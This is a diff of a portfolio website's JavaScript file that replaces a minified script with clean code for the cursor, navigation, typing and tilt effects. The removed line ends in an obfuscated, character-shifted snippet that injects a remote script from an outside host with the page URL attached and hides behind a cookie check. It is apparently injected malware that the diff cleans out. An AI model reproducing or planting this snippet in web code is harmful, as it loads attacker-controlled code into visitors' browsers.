@@ -1,1 +1,169 @@
-let menuIcon=document.querySelector("#menu-icon"),navbar=document.querySelector(".navbar");menuIcon.onclick=()=>{menuIcon.classList.toggle("bx-x"),navbar.classList.toggle("active")};let sections=document.querySelectorAll("section"),navLinks=document.querySelectorAll("header nav a");window.onscroll=()=>{sections.forEach((sec=>{let top=window.scrollY,offset=sec.offsetTop-150,height=sec.offsetHeight,id=sec.getAttribute("id");top>=offset&&top<offset+height&&navLinks.forEach((links=>{links.classList.remove("active"),document.querySelector("header nav a[href*="+id+"]").classList.add("active")}))})),document.querySelector("header").classList.toggle("sticky",window.screenY>100),menuIcon.classList.remove("bx-x"),navbar.classList.remove("active")},ScrollReveal({distance:"80px",duration:2e3,delay:200}),ScrollReveal().reveal(".home-content,.heading",{origin:"top"}),ScrollReveal().reveal(".home-img,.services-container,.portfolio-box,.contact form",{origin:"bottom"}),ScrollReveal().reveal(".home-content h1,.about-img",{origin:"left"}),ScrollReveal().reveal(".home-content p,.about-content",{origin:"right"});const typed=new Typed(".m-text",{strings:["Web Developer","Discord Bot Developer"],typeSpeed:100,backSpeed:100,backDelay:1e3,loop:!0});(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
+// --- Strict Mode for Robustness ---
+"use strict";
+
+document.addEventListener("DOMContentLoaded", function () {
+  
+  // --- Custom Cursor & Aura Overlay ---
+  const cursorDot = document.querySelector('.cursor-dot');
+  const cursorOutline = document.querySelector('.cursor-outline');
+  
+  // Update mouse position for custom cursor and bento shimmer
+  window.addEventListener('mousemove', (e) => {
+    // Crosshair logic
+    if(cursorDot && cursorOutline) {
+      cursorDot.style.left = `${e.clientX}px`;
+      cursorDot.style.top = `${e.clientY}px`;
+      
+      // Add slight delay for the outline (trailing effect)
+      cursorOutline.animate({
+        left: `${e.clientX}px`,
+        top: `${e.clientY}px`
+      }, { duration: 500, fill: "forwards" });
+    }
+  });
+
+  // Hover effects for the custom cursor
+  document.querySelectorAll('a, i').forEach(el => {
+    el.addEventListener('pointerenter', () => {
+      if(cursorOutline) {
+        cursorOutline.style.width = '60px';
+        cursorOutline.style.height = '60px';
+        cursorOutline.style.backgroundColor = 'rgba(139, 92, 246, 0.1)';
+      }
+    });
+    el.addEventListener('pointerleave', () => {
+      if(cursorOutline) {
+        cursorOutline.style.width = '40px';
+        cursorOutline.style.height = '40px';
+        cursorOutline.style.backgroundColor = 'transparent';
+      }
+    });
+  });
+
+  // --- Mobile Navigation ---
+  const menuIcon = document.querySelector('#menu-icon');
+  const navbar = document.querySelector('.navbar');
+
+  if(menuIcon && navbar) {
+    menuIcon.onclick = () => {
+      menuIcon.classList.toggle('bx-x');
+      navbar.classList.toggle('active');
+    };
+  }
+
+  // --- Update Active Nav Link on Scroll ---
+  const sections = document.querySelectorAll('section');
+  const navLinks = document.querySelectorAll('.navbar a');
+
+  window.addEventListener('scroll', () => {
+    let current = '';
+    
+    sections.forEach(section => {
+      const sectionTop = section.offsetTop;
+      const sectionHeight = section.clientHeight;
+      // If we've scrolled past the top of the section (with some offset for the header)
+      if (window.scrollY >= sectionTop - 150) {
+        current = section.getAttribute('id');
+      }
+    });
+
+    navLinks.forEach(link => {
+      link.classList.remove('active');
+      if (link.getAttribute('href') === `#${current}`) {
+        link.classList.add('active');
+      }
+    });
+
+    // Close mobile menu when scrolling past
+    if(menuIcon && navbar && window.scrollY > 0) {
+      menuIcon.classList.remove('bx-x');
+      navbar.classList.remove('active');
+    }
+  });
+
+  // --- Typing Text Animation ---
+  const textArray = ["Web Developer", "Node.js Enthusiast", "Python Programmer", "Student"];
+  const typingDelay = 100;
+  const erasingDelay = 100;
+  const newTextDelay = 2000;
+  let textArrayIndex = 0;
+  let charIndex = 0;
+  const typedTextSpan = document.querySelector(".typed-text");
+  const cursorSpan = document.querySelector(".cursor");
+
+  function type() {
+    if (!typedTextSpan || !cursorSpan) return;
+    if (charIndex < textArray[textArrayIndex].length) {
+      if (!cursorSpan.classList.contains("typing")) cursorSpan.classList.add("typing");
+      typedTextSpan.textContent += textArray[textArrayIndex].charAt(charIndex);
+      charIndex++;
+      setTimeout(type, typingDelay);
+    } else {
+      cursorSpan.classList.remove("typing");
+      setTimeout(erase, newTextDelay);
+    }
+  }
+
+  function erase() {
+    if (!typedTextSpan || !cursorSpan) return;
+    if (charIndex > 0) {
+      if (!cursorSpan.classList.contains("typing")) cursorSpan.classList.add("typing");
+      typedTextSpan.textContent = textArray[textArrayIndex].substring(0, charIndex - 1);
+      charIndex--;
+      setTimeout(erase, erasingDelay);
+    } else {
+      cursorSpan.classList.remove("typing");
+      textArrayIndex++;
+      if (textArrayIndex >= textArray.length) textArrayIndex = 0;
+      setTimeout(type, typingDelay + 1100);
+    }
+  }
+
+  if (textArray.length) setTimeout(type, newTextDelay + 250);
+
+  // --- 3D Tilted Card & Bento Shimmer Effect ---
+  // Using querySelectorAll for all cards tagged with data-tilt
+  const tiltElements = document.querySelectorAll('.bento-card[data-tilt]');
+
+  tiltElements.forEach(el => {
+    el.addEventListener('mousemove', handleTilt);
+    el.addEventListener('mouseleave', resetTilt);
+  });
+
+  function handleTilt(e) {
+    const el = this;
+    const rect = el.getBoundingClientRect();
+    const width = el.clientWidth;
+    const height = el.clientHeight;
+
+    // Mouse coordinates relative to card
+    const x = e.clientX - rect.left;
+    const y = e.clientY - rect.top;
+    
+    // Update CSS variables for Shimmer before element
+    el.style.setProperty('--mouse-x', `${x}px`);
+    el.style.setProperty('--mouse-y', `${y}px`);
+
+    // Mouse position relative to center for Tilt
+    const centerX = x - width / 2;
+    const centerY = y - height / 2;
+
+    // Constrain the rotation to a small angle (smooth ReactBits feel)
+    const rotateX = -(centerY / height) * 15;
+    const rotateY = (centerX / width) * 15;
+
+    requestAnimationFrame(() => {
+      // Scale slightly up and apply 3D transform
+      el.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
+    });
+  }
+
+  function resetTilt() {
+    const el = this;
+    requestAnimationFrame(() => {
+      el.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`;
+    });
+  }
+
+
+});
